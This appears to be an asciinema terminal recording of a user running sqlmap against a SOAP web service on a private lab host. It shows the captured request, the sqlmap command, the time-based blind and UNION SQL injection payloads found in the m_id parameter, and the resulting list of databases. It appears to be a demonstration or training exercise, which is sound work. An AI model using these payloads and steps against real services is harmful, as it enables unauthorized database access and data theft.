@@ -1,0 +1,722 @@
+{
+  "version": 1,
+  "width": 92,
+  "height": 35,
+  "duration": 69.037359,
+  "command": "/bin/bash",
+  "title": "",
+  "env": {
+    "TERM": "xterm",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.011686,
+      "priyo@selene:~$ "
+    ],
+    [
+      0.798175,
+      "c"
+    ],
+    [
+      0.140081,
+      "a"
+    ],
+    [
+      0.170289,
+      "t"
+    ],
+    [
+      0.256143,
+      " "
+    ],
+    [
+      0.399587,
+      "/"
+    ],
+    [
+      1.179539,
+      "h"
+    ],
+    [
+      0.145535,
+      "o"
+    ],
+    [
+      0.734244,
+      "me/"
+    ],
+    [
+      0.466495,
+      "p"
+    ],
+    [
+      0.173709,
+      "r"
+    ],
+    [
+      0.112603,
+      "i"
+    ],
+    [
+      0.290367,
+      "yo/"
+    ],
+    [
+      0.469348,
+      "s"
+    ],
+    [
+      0.117394,
+      "o"
+    ],
+    [
+      0.607117,
+      "ap.txt "
+    ],
+    [
+      0.659291,
+      "\r\n"
+    ],
+    [
+      0.002200,
+      "POST /backup/why_me.php HTTP/1.1\r\r\n"
+    ],
+    [
+      0.000008,
+      "Host: 192.168.78.128:9799\r\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0\r\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\r\nAccept-Language: en-US,en;q=0.5\r\r\nAccept-Encoding: gzip, deflate\r"
+    ],
+    [
+      0.000004,
+      "\r\nContent-Type: text/xml; charset=UTF-8\r\r\n"
+    ],
+    [
+      0.000003,
+      "Soapaction: http://192.168.78.128/soap/avenger/member\r"
+    ],
+    [
+      0.000003,
+      "\r\nContent-Length: 320\r"
+    ],
+    [
+      0.000003,
+      "\r\n"
+    ],
+    [
+      0.000003,
+      "Connection: keep-alive\r\r\n"
+    ],
+    [
+      0.000002,
+      "Pragma: no-cache\r"
+    ],
+    [
+      0.000002,
+      "\r\n"
+    ],
+    [
+      0.000002,
+      "Cache-Control: no-cache\r"
+    ],
+    [
+      0.000002,
+      "\r\n"
+    ],
+    [
+      0.000002,
+      "\r\r\n"
+    ],
+    [
+      0.000015,
+      "\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\u003csoap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\u003csoap:Body\u003e\u003cmember xmlns=\"http://192.168.78.128/soap/avenger\"\u003e\u003cm_id\u003e2\u003c/m_id\u003e\u003c/member\u003e\u003c/soap:Body\u003e\u003c/soap:Envelope\u003e"
+    ],
+    [
+      0.000139,
+      "priyo@selene:~$ "
+    ],
+    [
+      1.145709,
+      "c"
+    ],
+    [
+      0.107439,
+      "d"
+    ],
+    [
+      0.167802,
+      " "
+    ],
+    [
+      0.270851,
+      "/"
+    ],
+    [
+      0.310998,
+      "o"
+    ],
+    [
+      0.079533,
+      "p"
+    ],
+    [
+      0.193307,
+      "t/"
+    ],
+    [
+      0.315924,
+      "s"
+    ],
+    [
+      0.197364,
+      "q"
+    ],
+    [
+      0.136919,
+      "l"
+    ],
+    [
+      0.222464,
+      "map/"
+    ],
+    [
+      0.791123,
+      "\r\npriyo@selene:/opt/sqlmap$ "
+    ],
+    [
+      0.585601,
+      "."
+    ],
+    [
+      0.498730,
+      "/"
+    ],
+    [
+      0.262061,
+      "s"
+    ],
+    [
+      0.272800,
+      "q"
+    ],
+    [
+      0.166665,
+      "l"
+    ],
+    [
+      0.208986,
+      "\u0007map"
+    ],
+    [
+      0.641895,
+      "."
+    ],
+    [
+      0.325208,
+      "p"
+    ],
+    [
+      0.278878,
+      "y "
+    ],
+    [
+      1.179469,
+      "-"
+    ],
+    [
+      0.171022,
+      "r"
+    ],
+    [
+      0.215255,
+      " "
+    ],
+    [
+      0.261804,
+      "/"
+    ],
+    [
+      0.272777,
+      "h"
+    ],
+    [
+      0.097142,
+      "o"
+    ],
+    [
+      0.271026,
+      "me/"
+    ],
+    [
+      0.888555,
+      "p"
+    ],
+    [
+      0.204854,
+      "r"
+    ],
+    [
+      0.126344,
+      "i"
+    ],
+    [
+      0.238172,
+      "yo/"
+    ],
+    [
+      0.790682,
+      "s"
+    ],
+    [
+      0.375209,
+      "o"
+    ],
+    [
+      0.171220,
+      "ap.txt "
+    ],
+    [
+      1.618158,
+      "-"
+    ],
+    [
+      0.569361,
+      "p"
+    ],
+    [
+      1.169692,
+      " "
+    ],
+    [
+      0.867735,
+      "m"
+    ],
+    [
+      0.307467,
+      "i"
+    ],
+    [
+      0.634543,
+      "\u0008\u001b[K"
+    ],
+    [
+      0.564311,
+      "_"
+    ],
+    [
+      0.504708,
+      "i"
+    ],
+    [
+      0.274831,
+      "d"
+    ],
+    [
+      0.566304,
+      " "
+    ],
+    [
+      0.638390,
+      "-"
+    ],
+    [
+      0.166911,
+      "-"
+    ],
+    [
+      0.788938,
+      "d"
+    ],
+    [
+      0.319379,
+      "b"
+    ],
+    [
+      0.437801,
+      "s"
+    ],
+    [
+      1.484913,
+      "\r\n"
+    ],
+    [
+      0.198563,
+      "\u001b[?1034h"
+    ],
+    [
+      0.000830,
+      "\u001b[01;33m         _\r\n ___ ___| |_____ ___ ___  \u001b[01;37m{\u001b[01;33m1.0-dev-99c1cc9\u001b[01;37m}\u001b[01;33m\r\n|_ -| . | |     | .'| . |\r\n|___|_  |_|_|_|_|__,|  _|\r\n"
+    ],
+    [
+      0.000006,
+      "      |_|           |_|   \u001b[0m\u001b[4;37mhttp://sqlmap.org\u001b[0m\r\n\r\n"
+    ],
+    [
+      0.000034,
+      "[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\r\n\r\n"
+    ],
+    [
+      0.000048,
+      "[*] starting at 00:05:14\r\n"
+    ],
+    [
+      0.000003,
+      "\r\n"
+    ],
+    [
+      0.000251,
+      "\r\u001b[32m[00:05:14] [INFO] parsing HTTP request from '/home/priyo/soap.txt'\u001b[0m"
+    ],
+    [
+      0.000004,
+      "\r\n"
+    ],
+    [
+      0.105462,
+      "\r\u001b[33m[00:05:14] [WARNING] using '/home/priyo/.sqlmap/output' as the output directory\u001b[0m\r\n"
+    ],
+    [
+      0.001539,
+      "\u001b[1m\rSOAP/XML data found in POST data. Do you want to process it? [Y/n/q] \u001b[0m"
+    ],
+    [
+      1.399206,
+      "y"
+    ],
+    [
+      1.633318,
+      "\r\n"
+    ],
+    [
+      0.002138,
+      "\r\u001b[32m[00:05:17] [INFO] testing connection to the target URL\u001b[0m\r\n"
+    ],
+    [
+      0.048536,
+      "\r\u001b[32m[00:05:17] [INFO] testing if the target URL is stable. This can take a couple of seconds\u001b[0m\r\n"
+    ],
+    [
+      1.016344,
+      "\r\u001b[32m[00:05:18] [INFO] target URL is stable\u001b[0m\r\n"
+    ],
+    [
+      0.000243,
+      "\r\u001b[32m[00:05:18] [INFO] testing if (custom) POST parameter 'SOAP m_id' is dynamic\u001b[0m\r\n"
+    ],
+    [
+      0.009099,
+      "\r\u001b[33m[00:05:18] [WARNING] (custom) POST parameter 'SOAP m_id' does not appear dynamic\u001b[0m\r\n"
+    ],
+    [
+      0.009911,
+      "\u001b[33m\u001b[1m\r[00:05:18] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'SOAP m_id' might not be injectable\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.008326,
+      "\r\u001b[32m[00:05:18] [INFO] testing for SQL injection on (custom) POST parameter 'SOAP m_id'\u001b[0m\r\n"
+    ],
+    [
+      0.055087,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\u001b[0m\r\n"
+    ],
+    [
+      0.167961,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'MySQL \u003e= 5.0 boolean-based blind - Parameter replace'\u001b[0m\r\n"
+    ],
+    [
+      0.115987,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'MySQL \u003e= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'\u001b[0m\r\n"
+    ],
+    [
+      0.057330,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\u001b[0m\r\n"
+    ],
+    [
+      0.055556,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'\u001b[0m\r\n"
+    ],
+    [
+      0.055651,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\u001b[0m\r\n"
+    ],
+    [
+      0.056447,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'MySQL \u003e= 5.0 error-based - Parameter replace'\u001b[0m\r\n"
+    ],
+    [
+      0.010301,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'MySQL inline queries'\u001b[0m"
+    ],
+    [
+      0.000007,
+      "\r\n"
+    ],
+    [
+      0.010207,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'PostgreSQL inline queries'\u001b[0m\r\n"
+    ],
+    [
+      0.010011,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'\u001b[0m\r\n"
+    ],
+    [
+      0.010090,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'MySQL \u003e 5.0.11 stacked queries (SELECT - comment)'\u001b[0m\r\n"
+    ],
+    [
+      0.055068,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'PostgreSQL \u003e 8.1 stacked queries (comment)'\u001b[0m\r\n"
+    ],
+    [
+      0.057402,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'\u001b[0m\r\n"
+    ],
+    [
+      0.055892,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'\u001b[0m\r\n"
+    ],
+    [
+      0.067418,
+      "\r\u001b[32m[00:05:19] [INFO] testing 'MySQL \u003e= 5.0.12 AND time-based blind (SELECT)'\u001b[0m\r\n"
+    ],
+    [
+      10.034257,
+      "\u001b[32m\u001b[1m\r[00:05:29] [INFO] (custom) POST parameter 'SOAP m_id' seems to be 'MySQL \u003e= 5.0.12 AND time-based blind (SELECT)' injectable \u001b[0m\u001b[0m\r\n\u001b[1m\rit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] \u001b[0m"
+    ],
+    [
+      0.969911,
+      "y"
+    ],
+    [
+      1.683258,
+      "\r\n\u001b[1m\rfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] \u001b[0m"
+    ],
+    [
+      0.955197,
+      "y"
+    ],
+    [
+      0.735556,
+      "\r\n\r\u001b[32m[00:05:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\u001b[0m\r\n\r\u001b[32m[00:05:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\u001b[0m\r\n"
+    ],
+    [
+      0.197490,
+      "\r\u001b[32m[00:05:34] [INFO] target URL appears to be UNION injectable with 3 columns\u001b[0m\r\n"
+    ],
+    [
+      0.034198,
+      "\u001b[32m\u001b[1m\r[00:05:34] [INFO] (custom) POST parameter 'SOAP m_id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.002777,
+      "\u001b[1m\r(custom) POST parameter 'SOAP m_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] \u001b[0m"
+    ],
+    [
+      2.357018,
+      "n"
+    ],
+    [
+      0.404504,
+      "\r\n"
+    ],
+    [
+      0.185177,
+      "sqlmap identified the following injection points with a total of 100 HTTP(s) requests:\r\n---\r\nParameter: SOAP m_id ((custom) POST)\r\n    Type: AND/OR time-based blind\r\n    Title: MySQL \u003e= 5.0.12 AND time-based blind (SELECT)\r\n    Payload: \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\u003csoap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\u003csoap:Body\u003e\u003cmember xmlns=\"http://192.168.78.128/soap/avenger\"\u003e\u003cm_id\u003e2 AND (SELECT * FROM (SELECT(SLEEP(5)))rhMZ)\u003c/m_id\u003e\u003c/member\u003e\u003c/soap:Body\u003e\u003c/soap:Envelope\u003e\r\n"
+    ],
+    [
+      0.000011,
+      "\r\n    Type: UNION query\r\n    Title: Generic UNION query (NULL) - 3 columns\r\n    Payload: \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\u003csoap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e\u003csoap:Body\u003e\u003cmember xmlns=\"http://192.168.78.128/soap/avenger\"\u003e\u003cm_id\u003e2 UNION ALL SELECT CONCAT(0x716b787671,0x69705876454b49795373,0x71787a6b71),NULL,NULL-- \u003c/m_id\u003e\u003c/member\u003e\u003c/soap:Body\u003e\u003c/soap:Envelope\u003e\r\n---\r\n"
+    ],
+    [
+      0.001936,
+      "\u001b[32m\u001b[1m\r[00:05:37] [INFO] the back-end DBMS is MySQL\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000142,
+      "web server operating system: Linux Ubuntu\r\n"
+    ],
+    [
+      0.000003,
+      "web application technology: PHP 5.5.3\r\nback-end DBMS: MySQL 5.0.12"
+    ],
+    [
+      0.000003,
+      "\r\n"
+    ],
+    [
+      0.000251,
+      "\r\u001b[32m[00:05:37] [INFO] fetching database names\u001b[0m"
+    ],
+    [
+      0.000003,
+      "\r\n"
+    ],
+    [
+      0.042708,
+      "available databases [5]:\r\n"
+    ],
+    [
+      0.000048,
+      "[*] dvwa\r\n"
+    ],
+    [
+      0.000046,
+      "[*] information_schema\r\n"
+    ],
+    [
+      0.000036,
+      "[*] mysql\r\n"
+    ],
+    [
+      0.000040,
+      "[*] performance_schema\r\n"
+    ],
+    [
+      0.000033,
+      "[*] tugas_kuliah\r\n"
+    ],
+    [
+      0.000028,
+      "\r\n"
+    ],
+    [
+      0.000278,
+      "\r\u001b[32m[00:05:37] [INFO] fetched data logged to text files under '/home/priyo/.sqlmap/output/192.168.78.128'\u001b[0m"
+    ],
+    [
+      0.000002,
+      "\r\n"
+    ],
+    [
+      0.000057,
+      "\r\n[*] shutting down at 00:05:37"
+    ],
+    [
+      0.000002,
+      "\r\n\r\n"
+    ],
+    [
+      0.181116,
+      "priyo@selene:/opt/sqlmap$ "
+    ],
+    [
+      3.746194,
+      "e"
+    ],
+    [
+      0.287821,
+      "c"
+    ],
+    [
+      0.123224,
+      "h"
+    ],
+    [
+      0.073323,
+      "o"
+    ],
+    [
+      0.123859,
+      " "
+    ],
+    [
+      0.747894,
+      "\""
+    ],
+    [
+      1.273559,
+      "d"
+    ],
+    [
+      0.208910,
+      "o"
+    ],
+    [
+      0.148013,
+      "o"
+    ],
+    [
+      0.999064,
+      "\u0008\u001b[K"
+    ],
+    [
+      0.160863,
+      "\u0008\u001b[K"
+    ],
+    [
+      0.144475,
+      "\u0008\u001b[K"
+    ],
+    [
+      0.112723,
+      "b"
+    ],
+    [
+      0.292819,
+      "p"
+    ],
+    [
+      0.179111,
+      "o"
+    ],
+    [
+      0.450325,
+      "\u0008\u001b[K"
+    ],
+    [
+      0.155473,
+      "\u0008\u001b[K"
+    ],
+    [
+      0.340792,
+      "o"
+    ],
+    [
+      0.218451,
+      "o"
+    ],
+    [
+      0.366390,
+      "m"
+    ],
+    [
+      0.855473,
+      " "
+    ],
+    [
+      0.219385,
+      ":"
+    ],
+    [
+      0.541334,
+      ")"
+    ],
+    [
+      0.828587,
+      "\""
+    ],
+    [
+      0.253864,
+      "\r\nboom :)\r\npriyo@selene:/opt/sqlmap$ "
+    ],
+    [
+      1.927035,
+      "e"
+    ],
+    [
+      0.607336,
+      "x"
+    ],
+    [
+      0.137020,
+      "i"
+    ],
+    [
+      0.123789,
+      "t"
+    ],
+    [
+      0.238609,
+      "\r\nexit\r\n"
+    ]
+  ]
+}
